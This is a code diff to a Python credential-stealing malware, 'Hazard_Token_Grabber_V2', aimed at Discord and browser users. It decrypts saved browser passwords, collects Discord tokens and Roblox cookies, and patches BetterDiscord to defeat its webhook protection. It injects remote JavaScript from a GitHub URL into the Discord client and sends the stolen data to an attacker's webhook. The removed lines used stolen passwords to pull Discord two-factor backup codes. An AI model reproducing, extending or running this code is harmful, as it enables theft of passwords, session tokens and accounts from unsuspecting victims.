@@ -33,8 +33,6 @@ class Hazard_Token_Grabber_V2:
         self.tokens = []
         self.robloxcookies = []
         self.files = ""
-        self.discord_psw = []
-        self.backup_codes = []
         
         self.bypassBetterDiscord()
         self.bypassTokenProtector()
@@ -64,7 +62,7 @@ class Hazard_Token_Grabber_V2:
                             print("ok")
 
         self.SendInfo()
-        self.Injection()
+        self.injector()
         shutil.rmtree(self.tempfolder)
         
     def getheaders(self, token=None, content_type="application/json"):
@@ -76,7 +74,7 @@ class Hazard_Token_Grabber_V2:
             headers.update({"Authorization": token})
         return headers
 
-    def Injection(self):
+    def injector(self):
         for root, dirs, files in os.walk(self.appdata):
             for name in dirs:
                 if "discord_desktop_core-" in name:
@@ -85,10 +83,10 @@ class Hazard_Token_Grabber_V2:
                     except FileNotFoundError:
                         pass
                     try:
-                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
+                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\initiation"))
                     except FileExistsError:
                         pass
-                    f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
+                    f = requests.get("https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js").text.replace("%WEBHOOK%", self.webhook)
                     with open(directory_list, 'w', encoding="utf-8") as index_file:
                         index_file.write(f)
         for root, dirs, files in os.walk(self.roaming+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
@@ -143,13 +141,11 @@ class Hazard_Token_Grabber_V2:
         bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
         if os.path.exists(bd):
             x = "api/webhooks"
-            with open(bd, "r+", errors="ignore") as f:
-                l = f.readlines()
-                for i in l:
-                    if x in i:
-                        Replacement = i.replace(x, "RdimoTheGoat")
-                        l = Replacement
-                f.writelines(l)
+            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
+                txt = f.read()
+                content = txt.replace(x, 'RdimoTheGoat')
+            with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
+                f.write(content)
 
     def getProductValues(self):
         try:
@@ -202,8 +198,6 @@ class Hazard_Token_Grabber_V2:
                     decrypted_password = self.decrypt_password(encrypted_password, master_key)
                     if url != "":
                         f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
-                        if "discord" in url.lower():
-                            self.discord_psw.append(decrypted_password)
             except Exception:
                 pass
         cursor.close()
@@ -324,18 +318,6 @@ class Hazard_Token_Grabber_V2:
             j = requests.get(self.baseurl, headers=self.getheaders(token)).json()
             user = j.get('username') + '#' + str(j.get("discriminator"))
 
-            if token.startswith("mfa.") and self.discord_psw:
-                with open(self.tempfolder+os.sep+"Discord backupCodes.txt", "a", errors="ignore") as fp:
-                    fp.write(f"{user} Backup Codes".center(36, "-")+"\n")
-                    for x in self.discord_psw:
-                        try:
-                            r = requests.post(self.baseurl+"/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
-                            for i in r.get("backup_codes"):
-                                if i not in self.backup_codes:
-                                    self.backup_codes.append(i)
-                                    fp.write(f'\t{i.get("code")} | {"Already used" if i.get("consumed") == True else "Not used"}\n')
-                        except Exception:
-                            pass
             badges = ""
             flags = j['flags']
             if (flags == 1): badges += "Staff, "
